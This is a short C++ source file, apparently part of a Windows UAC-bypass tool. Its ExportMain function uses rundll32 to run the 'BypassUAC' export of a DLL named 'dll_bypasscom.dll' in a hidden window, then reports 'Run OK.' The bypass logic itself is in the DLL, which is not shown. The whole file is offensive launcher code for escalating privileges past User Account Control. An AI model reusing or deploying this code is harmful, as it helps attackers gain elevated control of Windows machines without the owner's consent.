#include "pch.h"
#include "export.h"
#include <Windows.h>
#include <cstdio>


#define DLL_PATH "dll_bypasscom.dll"

int ExportMain() {
	char szCmdLine[MAX_PATH] = { 0 };
	char szRundll32Path[MAX_PATH] = "C:\\Windows\\System32\\rundll32.exe";
	char szDllPath[MAX_PATH] = DLL_PATH;
	//::sprintf_s(szCmdLine, "%s \"%s\" %s", szRundll32Path, szDllPath, "BypassUAC");
	std::snprintf(szCmdLine, MAX_PATH, "%s \"%s\" %s", szRundll32Path, szDllPath, "BypassUAC");

	::WinExec(szCmdLine, SW_HIDE);

	MessageBox(NULL, "Run OK.\n", "info", MB_OK);

	return 0;
}